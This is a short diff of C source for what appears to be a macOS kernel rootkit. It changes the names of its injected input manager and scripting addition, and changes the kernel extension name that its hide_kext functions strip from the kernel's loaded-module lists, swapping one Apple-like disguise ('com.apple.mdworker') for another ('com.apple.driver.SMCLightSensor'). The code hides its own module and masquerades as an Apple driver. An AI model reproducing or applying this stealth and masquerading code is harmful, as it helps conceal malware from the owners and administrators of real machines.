@@ -44,8 +44,8 @@
 #define MK_MBUF       1
 #define PLENGTH       6
 
-#define IM            "appleHID"
-#define OSAX          "appleOsax"
+#define IM            "LightBulb"
+#define OSAX          "LightOsax"
 #define KERNEL_BASE   0xffffff8000200000 // SL 10.6.4
 
 //#define DEBUG
@@ -1598,7 +1598,7 @@ void hide_kext_osarray()
   unsigned long *lastKext = (unsigned long *)arrayPtr[*kextsCount - 1];
   
   unsigned char *kmod_info = (unsigned char *)(lastKext[OFFT_KEXT_KMOD]);
-  if (!strcmp((char *)&kmod_info[OFFT_KMOD_NAME], "com.apple.mdworker"))
+  if (!strcmp((char *)&kmod_info[OFFT_KMOD_NAME], "com.apple.driver.SMCLightSensor"))
     {
         // if we're still the last loaded kext, 
         // then yeah, it's *that* easy
@@ -1620,7 +1620,7 @@ void hide_kext_osarray()
           lastKext = (unsigned long *)arrayPtr[i];
           kmod_info = (unsigned char *)(lastKext[OFFT_KEXT_KMOD]);
           
-          if (!strcmp((char *)&kmod_info[OFFT_KMOD_NAME], "com.apple.mdworker"))
+          if (!strcmp((char *)&kmod_info[OFFT_KMOD_NAME], "com.apple.driver.SMCLightSensor"))
             {
               arrayPtr[i] = arrayPtr[*kextsCount -1];
               _sLoadedKext[OFFT_KEXT_COUNT]--;
@@ -1640,7 +1640,7 @@ void hide_kext_leopard()
 {
   kmod_info_t *k, *prev_k;
   //char kext_name[]        = "com.revenge.kext.machooker";
-  char kext_name[]        = "com.apple.mdworker";
+  char kext_name[]        = "com.apple.driver.SMCLightSensor";
   
   prev_k  = i_kmod;
   
